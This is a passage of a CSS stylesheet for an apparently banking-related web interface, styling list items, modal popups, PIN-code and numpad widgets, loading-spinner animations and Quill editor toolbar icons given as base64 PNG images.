.list-group .list-group-item.action .list-group-item-wrapper:hover .pull-right:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    left: -40px;
    top: 0;
    content: " ";
    pointer-events: none;
    box-shadow: -45px 0 30px -30px rgb(243.3, 243.3, 244.6) inset;
    transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.list-group .list-group-item.activeitem .pull-right:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    left: -40px;
    top: 0;
    content: " ";
    pointer-events: none;
    box-shadow: -45px 0 30px -30px #A8A8A8 inset;
    transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

@media (min-width:1025px) {
    .list-group .list-group-item .swipe-actions:after {
        display: block;
        position: absolute;
        height: 100%;
        width: 40px;
        left: -40px;
        top: 0;
        content: " ";
        pointer-events: none;
        box-shadow: -45px 0 30px -30px white inset;
        transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
    }

    .list-group .list-group-item .swipe-actions .action.action-1:hover,
    .list-group .list-group-item .swipe-actions .action.action-2:hover,
    .list-group .list-group-item .swipe-actions .action.action-3:hover {
        background: #f6f6f7
    }
}

.list-group .list-group-item .radio-button:after {
    content: " ";
    display: block;
    width: 4px;
    height: 4px;
    border-radius: 2px;
    background-color: white;
    position: absolute;
    top: 3px;
    left: 3px;
    transition: background-color 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.list-group .list-group-item.selected .radio-button:after {
    background-color: #FF6200
}

.list-group .list-group-item.selected .radio-button.with-success:after {
    display: none
}

.modal.info-popup:before,
.info-popup.confirmation-popup:before,
.info-popup.side-modal:before,
.modal.error-popup:before,
.error-popup.confirmation-popup:before,
.error-popup.side-modal:before,
.modal.success-popup:before,
.success-popup.confirmation-popup:before,
.success-popup.side-modal:before,
.modal.confirm-popup:before,
.confirm-popup.confirmation-popup:before,
.confirm-popup.side-modal:before,
.modal.password-popup:before,
.password-popup.confirmation-popup:before,
.password-popup.side-modal:before,
.modal.digicode-popup:before,
.digicode-popup.confirmation-popup:before,
.digicode-popup.side-modal:before,
.modal.lt-reauth-popup:before,
.lt-reauth-popup.confirmation-popup:before,
.lt-reauth-popup.side-modal:before {
    content: "";
    display: inline-block;
    height: 100%;
    vertical-align: middle;
    margin-right: -0.25em
}

.modal.info-popup .modal-dialog .modal-content .modal-header button.close:hover,
.info-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover,
.info-popup.side-modal .modal-dialog .modal-content .modal-header button.close:hover,
.modal.error-popup .modal-dialog .modal-content .modal-header button.close:hover,
.error-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover,
.error-popup.side-modal .modal-dialog .modal-content .modal-header button.close:hover,
.modal.success-popup .modal-dialog .modal-content .modal-header button.close:hover,
.success-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover,
.success-popup.side-modal .modal-dialog .modal-content .modal-header button.close:hover,
.modal.confirm-popup .modal-dialog .modal-content .modal-header button.close:hover,
.confirm-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover,
.confirm-popup.side-modal .modal-dialog .modal-content .modal-header button.close:hover,
.modal.password-popup .modal-dialog .modal-content .modal-header button.close:hover,
.password-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover,
.password-popup.side-modal .modal-dialog .modal-content .modal-header button.close:hover,
.modal.digicode-popup .modal-dialog .modal-content .modal-header button.close:hover,
.digicode-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover,
.digicode-popup.side-modal .modal-dialog .modal-content .modal-header button.close:hover,
.modal.lt-reauth-popup .modal-dialog .modal-content .modal-header button.close:hover,
.lt-reauth-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover,
.lt-reauth-popup.side-modal .modal-dialog .modal-content .modal-header button.close:hover {
    opacity: 0.8
}

.modal.info-popup .modal-dialog .modal-content .modal-header button.close:focus,
.info-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:focus,
.info-popup.side-modal .modal-dialog .modal-content .modal-header button.close:focus,
.modal.error-popup .modal-dialog .modal-content .modal-header button.close:focus,
.error-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:focus,
.error-popup.side-modal .modal-dialog .modal-content .modal-header button.close:focus,
.modal.success-popup .modal-dialog .modal-content .modal-header button.close:focus,
.success-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:focus,
.success-popup.side-modal .modal-dialog .modal-content .modal-header button.close:focus,
.modal.confirm-popup .modal-dialog .modal-content .modal-header button.close:focus,
.confirm-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:focus,
.confirm-popup.side-modal .modal-dialog .modal-content .modal-header button.close:focus,
.modal.password-popup .modal-dialog .modal-content .modal-header button.close:focus,
.password-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:focus,
.password-popup.side-modal .modal-dialog .modal-content .modal-header button.close:focus,
.modal.digicode-popup .modal-dialog .modal-content .modal-header button.close:focus,
.digicode-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:focus,
.digicode-popup.side-modal .modal-dialog .modal-content .modal-header button.close:focus,
.modal.lt-reauth-popup .modal-dialog .modal-content .modal-header button.close:focus,
.lt-reauth-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:focus,
.lt-reauth-popup.side-modal .modal-dialog .modal-content .modal-header button.close:focus {
    box-shadow: 0 0 8px #559BD1, 0 0 0 1px #559BD1
}

.modal.info-popup .modal-dialog .modal-content .modal-header button.close:active,
.info-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active,
.info-popup.side-modal .modal-dialog .modal-content .modal-header button.close:active,
.modal.error-popup .modal-dialog .modal-content .modal-header button.close:active,
.error-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active,
.error-popup.side-modal .modal-dialog .modal-content .modal-header button.close:active,
.modal.success-popup .modal-dialog .modal-content .modal-header button.close:active,
.success-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active,
.success-popup.side-modal .modal-dialog .modal-content .modal-header button.close:active,
.modal.confirm-popup .modal-dialog .modal-content .modal-header button.close:active,
.confirm-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active,
.confirm-popup.side-modal .modal-dialog .modal-content .modal-header button.close:active,
.modal.password-popup .modal-dialog .modal-content .modal-header button.close:active,
.password-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active,
.password-popup.side-modal .modal-dialog .modal-content .modal-header button.close:active,
.modal.digicode-popup .modal-dialog .modal-content .modal-header button.close:active,
.digicode-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active,
.digicode-popup.side-modal .modal-dialog .modal-content .modal-header button.close:active,
.modal.lt-reauth-popup .modal-dialog .modal-content .modal-header button.close:active,
.lt-reauth-popup.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active,
.lt-reauth-popup.side-modal .modal-dialog .modal-content .modal-header button.close:active {
    opacity: 0.6
}

.side-modal .modal-dialog .modal-content .modal-header button.close:hover {
    opacity: 0.8
}

.side-modal .modal-dialog .modal-content .modal-header button.close:active {
    opacity: 0.6
}

@media (max-width:1024px) {

    .side-modal.in .modal-backbutton:after,
    .side-modal.in-add .modal-backbutton:after,
    .side-modal.in-remove .modal-backbutton:after {
        content: " ";
        background: white;
        position: absolute;
        left: 5px;
        top: 5px;
        width: 40px;
        height: 40px;
        border-radius: 20px;
        opacity: 0;
        transition: opacity 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
    }

    .side-modal.in .modal-backbutton:active:after,
    .side-modal.in-add .modal-backbutton:active:after,
    .side-modal.in-remove .modal-backbutton:active:after {
        opacity: 0.3;
        transition: opacity 0s cubic-bezier(0.465, 0.183, 0.153, 0.946)
    }
}

.confirmation-popup .modal-dialog .modal-content .modal-header button.close:hover {
    opacity: 0.8
}

.confirmation-popup .modal-dialog .modal-content .modal-header button.close:active {
    opacity: 0.6
}

.info-box:after,
.sales-area:after {
    content: "";
    display: table;
    clear: both
}

.info-box .info-inline:after,
.sales-area .info-inline:after {
    content: "";
    display: table;
    clear: both
}

.info-box .config-inline:after,
.sales-area .config-inline:after {
    content: "";
    display: table;
    clear: both
}

.info-box .message-box .btn:not(.btn-primary):hover,
.sales-area .message-box .btn:not(.btn-primary):hover {
    background-color: #FF6200;
    color: white
}

.consent-wrapper .consent-authorization .list-group .list-group-item .pull-right::after {
    box-shadow: none
}

.consent-wrapper .consent-authorization .radio-wrapper .radio-button.selected:after {
    background-color: #FF6200
}

.consent-info-part-wrapper.list-group.list-group-fluid .list-group-item .list-group-item-wrapper .pull-right::after {
    box-shadow: none
}

.ing-tabs-container:after {
    content: "";
    display: table;
    clear: both
}

.ing-tabs-container .ing-tab:after {
    content: " ";
    display: block;
    width: 100%;
    height: 0;
    position: absolute;
    left: 0;
    bottom: 0;
    background-color: #FF6200;
    transition: height 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.ing-tabs-container .ing-tab.selected:after {
    height: 5px
}

.error-messages div:before,
p.error-message:before {
    content: "!";
    background: #d70000;
    color: white;
    display: inline-block;
    width: 14px;
    height: 14px;
    line-height: 14px;
    border-radius: 7px;
    font-size: 13px;
    text-align: center;
    margin-right: 5px
}

@keyframes rotator {
    0% {
        transform: rotate(0deg)
    }

    100% {
        transform: rotate(270deg)
    }
}

@keyframes dash {
    0% {
        stroke-dashoffset: 187
    }

    50% {
        stroke-dashoffset: 46.75;
        transform: rotate(135deg)
    }

    100% {
        stroke-dashoffset: 187;
        transform: rotate(450deg)
    }
}

@-webkit-keyframes container-rotate {
    to {
        -webkit-transform: rotate(360deg)
    }
}

@keyframes container-rotate {
    to {
        transform: rotate(360deg)
    }
}

@-webkit-keyframes fill-unfill-rotate {
    12.5% {
        -webkit-transform: rotate(135deg)
    }

    25% {
        -webkit-transform: rotate(270deg)
    }

    37.5% {
        -webkit-transform: rotate(405deg)
    }

    50% {
        -webkit-transform: rotate(540deg)
    }

    62.5% {
        -webkit-transform: rotate(675deg)
    }

    75% {
        -webkit-transform: rotate(810deg)
    }

    87.5% {
        -webkit-transform: rotate(945deg)
    }

    to {
        -webkit-transform: rotate(1080deg)
    }
}

@keyframes fill-unfill-rotate {
    12.5% {
        transform: rotate(135deg)
    }

    25% {
        transform: rotate(270deg)
    }

    37.5% {
        transform: rotate(405deg)
    }

    50% {
        transform: rotate(540deg)
    }

    62.5% {
        transform: rotate(675deg)
    }

    75% {
        transform: rotate(810deg)
    }

    87.5% {
        transform: rotate(945deg)
    }

    to {
        transform: rotate(1080deg)
    }
}

@-webkit-keyframes orange-fade-in-out {
    from {
        opacity: 0
    }

    65% {
        opacity: 0
    }

    75% {
        opacity: 1
    }

    90% {
        opacity: 1
    }

    100% {
        opacity: 0
    }
}

@keyframes orange-fade-in-out {
    from {
        opacity: 0
    }

    65% {
        opacity: 0
    }

    75% {
        opacity: 1
    }

    90% {
        opacity: 1
    }

    100% {
        opacity: 0
    }
}

@-webkit-keyframes left-spin {
    from {
        -webkit-transform: rotate(130deg)
    }

    50% {
        -webkit-transform: rotate(-5deg)
    }

    to {
        -webkit-transform: rotate(130deg)
    }
}

@keyframes left-spin {
    from {
        transform: rotate(130deg)
    }

    50% {
        transform: rotate(-5deg)
    }

    to {
        transform: rotate(130deg)
    }
}

@-webkit-keyframes right-spin {
    from {
        -webkit-transform: rotate(-130deg)
    }

    50% {
        -webkit-transform: rotate(5deg)
    }

    to {
        -webkit-transform: rotate(-130deg)
    }
}

@keyframes right-spin {
    from {
        transform: rotate(-130deg)
    }

    50% {
        transform: rotate(5deg)
    }

    to {
        transform: rotate(-130deg)
    }
}

@-webkit-keyframes fade-out {
    from {
        opacity: 1
    }

    to {
        opacity: 0
    }
}

@keyframes fade-out {
    from {
        opacity: 1
    }

    to {
        opacity: 0
    }
}

.numpad-keys:after {
    content: "";
    display: table;
    clear: both
}

.numpad-keys .numpad-key:hover {
    background: white
}

.numpad-keys .numpad-key:active {
    background: #f6f6f7
}

.numpad-keys .numpad-key.numpad-key-float:hover,
.numpad-keys .numpad-key.numpad-key-backspace:hover,
.numpad-keys .numpad-key.numpad-key-clear:hover {
    background: #f6f6f7
}

.numpad-keys .numpad-key.numpad-key-float:active,
.numpad-keys .numpad-key.numpad-key-backspace:active,
.numpad-keys .numpad-key.numpad-key-clear:active {
    background: rgb(235.2, 235.2, 237.4)
}

.numpad-container .numpad-wrapper .numpad-statusbar:after {
    content: "";
    display: table;
    clear: both
}

.pincode-container .pincode-digit:empty:after {
    content: " ";
    display: inline-block;
    width: 14px;
    height: 14px;
    border: 1px solid #A8A8A8;
    border-radius: 7px
}

.pincode-container .pincode-digit:empty.filled:after {
    background: #D9D9D9
}

/*!
 * ui-select
 * http://github.com/angular-ui/ui-select
 * Version: 0.9.6 - 2015-01-12T20:24:40.593Z
 * License: MIT
 */
/*!
 * ui-select
 * http://github.com/angular-ui/ui-select
 * Version: 0.9.5 - 2014-12-12T16:07:20.859Z
 * License: MIT
 */
.ui-select-bootstrap .ui-select-choices-row>a:hover,
.ui-select-bootstrap .ui-select-choices-row>a:focus {
    text-decoration: none;
    color: #262626;
    background-color: #f5f5f5
}

.mying-container-multi .mying-choices .mying-search-choice .mying-search-choice-close:hover {
    background-position: right -11px
}

.mying-offscreen:focus {
    clip: rect(0 0 0 0) !important;
    width: 1px !important;
    height: 1px !important;
    border: 0 !important;
    margin: 0 !important;
    padding: 0 !important;
    overflow: hidden !important;
    position: absolute !important;
    outline: 0 !important;
    left: 0px !important;
    top: 0px !important
}

.checkbox.checkbox-animated:after {
    content: "";
    display: table;
    clear: both
}

.form-group .checkbox.checkbox-animated:after {
    content: "";
    display: table;
    clear: both
}

.date-picker-input-group .datepicker-table:after,
.datepicker-wrapper .datepicker-table:after {
    content: " ";
    display: block;
    height: 15px
}

.search-results-pane:after {
    content: "";
    display: table;
    clear: both
}

/*! Quill Editor v0.18.1
 *  https://quilljs.com/
 *  Copyright (c) 2014, Jason Chen
 *  Copyright (c) 2013, salesforce.com
 */
.ql-picker .ql-picker-label:hover {
    color: #06c
}

.ql-picker .ql-picker-options .ql-picker-item:hover {
    color: #06c
}

.ql-picker.ql-color-picker .ql-picker-options .ql-picker-item:hover {
    border-color: #000
}

.toolbar-container:not(.ios) .ql-picker:not(.ql-expanded) .ql-picker-label:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAKlBMVEUAAAAAYc4AZMgAZcwAZs0AZs0AZs0AZ8wAZswAZs0AZswAZswAZswAZsx12LPhAAAADXRSTlMAFRzExcbLzM/Q0dLbKbcyLwAAADVJREFUCNdjYCAeMKYJQFnSdzdCWbl3r0NZvnev4tFre/cKlNV79yaUpXP3EJTFtEqBBHcAAHyoDQk0vM/lAAAAAElFTkSuQmCC)
}

.toolbar-container:not(.ios) .ql-format-button.ql-bold:hover,
.toolbar-container:not(.ios) .ql-picker.ql-bold .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=bold]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=bold]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAYFBMVEUAAAAAgP8AYL8AccYAatUAZswAZMgAZMsAZswAZcsAZcsAZssAZssAZ80AZswAZs0AZswAZ8wAZswAZcwAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsxCU9XcAAAAH3RSTlMAAggJDA8cQEtTWHF/i4yTpau+xMXX3O7v8/f6+/z+qN9w2AAAAFZJREFUeNqlzMcSgCAMRVEsYO+9vv//S9FhNIYld5HFmSTCqQ66dazkRzA1lPSQGRZGIsDMKMxRW7+2yCIcyf/QUyUGSnc+dkaqoFumM32pf2BqY+HUBfQaCPgVIBc1AAAAAElFTkSuQmCC)
}

.toolbar-container:not(.ios) .ql-format-button.ql-italic:hover,
.toolbar-container:not(.ios) .ql-picker.ql-italic .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=italic]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=italic]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAk0lEQVR42u3SsQ3CMBBA0X/2BozACMQswg4EMQMUdOyQVdggdpagZAc4ihjJjYmU66K8xpZsfdnSsVxCzTFdEW6AB0oKcqdrLhQcNaK+PLc79QfapLTDgz8cU9Tv8ibZQqIBgI8OxhexH29KPz90jltgA7zownN+6C0Nowhg+JqEvCZbSDSHNDJBLBNdctWJXv18Ad5dJL0jVfDhAAAAAElFTkSuQmCC)
}

.toolbar-container:not(.ios) .ql-format-button.ql-underline:hover,
.toolbar-container:not(.ios) .ql-picker.ql-underline .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=underline]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=underline]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAM1BMVEUAAAAAadIAYs4AZc0AZcwAZswAZ84AZswAZs0AZ8wAZcwAZs0AZswAZswAZswAZswAZsycBlETAAAAEHRSTlMAERpMbW6Bgry9xMXh5PP51ZZfkwAAAEdJREFUeNq9yEEKgDAMRNHERDWq6dz/tFLBQUC6KfRtPnzpsh/sC2AHrcRUo0iuDXONI7gMxVW9wIQWPFb5sMgMk5YTdMmvGw2DA8yS9di7AAAAAElFTkSuQmCC)
}

.toolbar-container:not(.ios) .ql-format-button.ql-strike:hover,
.toolbar-container:not(.ios) .ql-picker.ql-strike .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=strike]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=strike]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAolBMVEUAAAAAAP8AgP8AatUAYsQAYM8AadIAY8YAZswAYc4AZswAZM0AZcoAZswAZ8oAZswAZMsAZ8oAZswAZcoAZ8sAZswAZssAZssAZs0AZswAZ8wAZs0AZ8wAZs0AZswAZ8wAZ8wAZs0AZ8wAZ8wAZs0AZs0AZs0AZcwAZs0AZcwAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsyiCU+yAAAANXRSTlMAAQIMDRAREhQVKCk6PEhLT1xkZWZ4e4CAgoOEiImbnKGnq7CytsHExcnS19jg4uXq6/H190B1i7AAAAB/SURBVBgZpcDhFoEwGAbgt4pIBmImAJsEYfvu/9ZU52yn/z3oxk/vWuczD453psYRzoR0GkaLHzFYSzqhwvgY1pT0vI8WbzASQvDt/nJ7fN6ovb7P/HrYrTdZxoY+WoJEkoK14iEqPTKwFMkkCBJJClZcUqOM4USiMKYQETr5A2SVDLpJv6ZtAAAAAElFTkSuQmCC)
}

.toolbar-container:not(.ios) .ql-format-button.ql-link:hover,
.toolbar-container:not(.ios) .ql-picker.ql-link .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=link]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=link]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAmVBMVEUAAAD///8AVdUAbdsAccYAatUAZswAYs4AZswAY80AacsAZswAZM0AZ8kAZM0AZcsAZcoAZMsAZcoAZcoAZssAZs0AZs0AZ8wAZs0AZswAZs0AZswAZs0AZswAZs0AZs0AZs0AZ8wAZswAZcwAZs0AZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsy/jsjWAAAAMnRSTlMAAAYHCQwZGiMkJzIzOUJOYGNlfoCAiZeYm52gsbS2vMbHyMnK0NTh4ubr7O3v9fb5/BM/koAAAACXSURBVHjajdDbEoFQAIXhpROqiAjaSdGJSq33fzjTbDO7GS78l9/lj9lXvwnw0le8gEzSuufAhzshr2doCpaGopQhoOX0Fb0GE9fbnidFMYV2Z8c62hgfWj6Z7zqOVY4kuCXHuqBgbUmC4Z9rdsx0QSFpLGKQXWCxUbRloQNHJoqMisI6sLUVwalJtitMCHPRJDYk/fHrDdIHECSPJag6AAAAAElFTkSuQmCC)
}

.toolbar-container:not(.ios) .ql-format-button.ql-image:hover,
.toolbar-container:not(.ios) .ql-picker.ql-image .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=image]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=image]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAElBMVEUAAAAAZswAZcwAZs0AZs0AZszYB6XUAAAABXRSTlMAeMTFxj7M9NAAAABBSURBVAjXY2DAD1RDQSAYyAqFABALLANmMRnAWMwODIIMUFnGUAEIS1A0NADMYgTqhLBY4SyEKXCTTcGMEAJuAgBa9RKl6Fva+wAAAABJRU5ErkJggg==)
}

.toolbar-container:not(.ios) .ql-format-button.ql-list:hover,
.toolbar-container:not(.ios) .ql-picker.ql-list .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=list]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=list]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAS1BMVEUAAAAAZswAZ8kAZM0AZ8oAZcsAZcsAZswAZswAZ80AZs0AZs0AZ80AZ8wAZcwAZs0AZs0AZswAZswAZswAZswAZswAZswAZswAZswCB3gJAAAAGHRSTlMAMjRCQ0lOfYKQlJmaocTFxuHi5OXm9falfyKhAAAATElEQVR42mMgFnCKYIpJMDDwSUABP1yIHyYkABYRlBAmwngucV50IXZGIXTjmQTZ0I0XIcp4DjEedCFWFlF041mZRdCN5xDjZiAdAACXwgbrzvG+ZgAAAABJRU5ErkJggg==)
}

.toolbar-container:not(.ios) .ql-format-button.ql-bullet:hover,
.toolbar-container:not(.ios) .ql-picker.ql-bullet .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=bullet]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=bullet]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAD1BMVEUAAAAAZcwAZs0AZs0AZsyEYJIjAAAABHRSTlMAxMXG4b8ciAAAABxJREFUCNdjYMAPhBhdgMAJyFJmArGcGRgGXAcA/t0ImAOSO9kAAAAASUVORK5CYII=)
}

.toolbar-container:not(.ios) .ql-format-button.ql-authorship:hover,
.toolbar-container:not(.ios) .ql-picker.ql-authorship .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=authorship]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=authorship]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAARVBMVEUAAAAAZcoAaMsAZc4AZ8sAZ8oAZswAZcsAZ80AZs0AZ8wAZ8wAZswAZswAZswAZs0AZswAZswAZswAZswAZswAZswAZszAoUIuAAAAFnRSTlMAMDtOT1JfYmassMfN09Ta6vD4+fz9w8DTTwAAAExJREFUGBmVwEkSgCAMBMBRQUEU4zb/f6oFF5KbNLp4EQ8rkxnWQ76whBRYkYwwxo08ZijDzWJBs7La0ZysLjSJVUKXKSgOhQuKw08fJOYE1SddZQoAAAAASUVORK5CYII=)
}

.toolbar-container:not(.ios) .ql-format-button.ql-color:hover,
.toolbar-container:not(.ios) .ql-picker.ql-color .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=color]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=color]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAgVBMVEUAAAAAAP8AgP8AgL8AVdUAa8kAaNEAZMkAZ8gAZswAZM0AZMsAZc0AZ8oAZcsAZc4AZ8sAZswAZcsAZc0AZswAZ80AZcoAZcoAZs0AZ80AZs0AZs0AZs0AZ8wAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsy3JBcuAAAAKnRSTlMAAQIEBhMWISUtLkVMTU5OT1BTVlpmeX6OkJmdvL3GztTj5/Hy8/b3/f5utmv0AAAAX0lEQVR42pXIRQ6AQABDUdzd3bX3PyCWwAwr+Is2ecyvuKriXmQB5otKoKBFQz+sKkU5khQZKdK8yMoyiQTFOIseEbqLWv6mAPW+bAPvJmN0j/N7nfmTHRI5Jzk0fWwD4foJPqgJbeoAAAAASUVORK5CYII=)
}

.toolbar-container:not(.ios) .ql-format-button.ql-background:hover,
.toolbar-container:not(.ios) .ql-picker.ql-background .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=background]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=background]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAllBMVEUAAAAAAP8AgP8AgL8AVdUAbbYAYL8Aa8kAZswAaNEAZMkAZswAZ8gAZswAZM0AaMsAaNAAZswAZM0AZMsAZswAZc0AZ8oAZ80AZcsAZswAZcsAZc0AZswAZcoAZcoAZs0AZ80AZs0AZs0AZs0AZ8wAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsy8dW5vAAAAMXRSTlMAAQIEBgcIExQWISMlLS4xNjdCRUtMTU1OUFNWWnl+jpCZnby9xs7U4+fx8vP29/3+dqGBzgAAAH5JREFUeNqNj0cOg0AUQx1CgFQS0nujd9//ckigDzM7rFlYT34afYzOuX2WFCjl0BWBRhAYOnEu5EkTPfjkH9pswzSr15r44/vDr6mI87JarKrCHmbOi22ethDPTDoUT3vxwRDAJOJtKbNjfnUB957uhVjATPkLyslbYIexaQB/ngudkm14XQAAAABJRU5ErkJggg==)
}

.toolbar-container:not(.ios) .ql-format-button.ql-left:hover,
.toolbar-container:not(.ios) .ql-picker.ql-left .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=left]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=left]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAD1BMVEUAAAAAZcwAZs0AZs0AZsyEYJIjAAAABHRSTlMAxMXG4b8ciAAAAClJREFUCNdjYMAPRFxcnCAsFRcXZwYiAFCHC0STCpjlTJwOJwaYDoIaAKIACBBRNsu4AAAAAElFTkSuQmCC)
}

.toolbar-container:not(.ios) .ql-format-button.ql-right:hover,
.toolbar-container:not(.ios) .ql-picker.ql-right .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=right]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=right]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAD1BMVEUAAAAAZcwAZs0AZs0AZsyEYJIjAAAABHRSTlMAxMXG4b8ciAAAAChJREFUCNdjYCAIRFxcnCAsFRcXZ2KUu0B0qIBZzgzEaXFigGkhpAMAmbwIEMJ9k/cAAAAASUVORK5CYII=)
}

.toolbar-container:not(.ios) .ql-format-button.ql-center:hover,
.toolbar-container:not(.ios) .ql-picker.ql-center .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=center]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=center]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAD1BMVEUAAAAAZcwAZs0AZs0AZsyEYJIjAAAABHRSTlMAxMXG4b8ciAAAAC1JREFUCNdjYCAAGF1cXBTALCYgy4CBIBBxAQEnIEsFzHJmIMYKiCVMYBYhSwCyqQhMfft6AQAAAABJRU5ErkJggg==)
}

.toolbar-container:not(.ios) .ql-format-button.ql-justify:hover,
.toolbar-container:not(.ios) .ql-picker.ql-justify .ql-picker-label:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=justify]:hover,
.toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=justify]:hover {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAALklEQVR42mMYvoARzko9cwTIsyZR+zGGWcZgPUwIMUZGShwyGtijgT0a2EMMAADESwwWta/i5QAAAABJRU5ErkJggg==)
}

@media (-webkit-min-device-pixel-ratio:2) {
    .toolbar-container:not(.ios) .ql-picker:not(.ql-expanded) .ql-picker-label:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkBAMAAAATLoWrAAAAIVBMVEUAAAAAZ8oAZMsAZc0AZswAZswAZswAZswAZswAZswAZswhMkyGAAAACnRSTlMATVRbaeXo6fz+NPhZJgAAAF9JREFUKM9jYBjkQC0JXYS5a4UBmpDFqlXN6IpWrUJTprEKCJpQhLJAQsswhZaiCImDhAJp5kMxkPGJZLjLEiQ0GUWIZdaqVSsdUM33XLVqCpqVLLPQFTEwmAcP9qQAAFUgKabkwE6gAAAAAElFTkSuQmCC)
    }

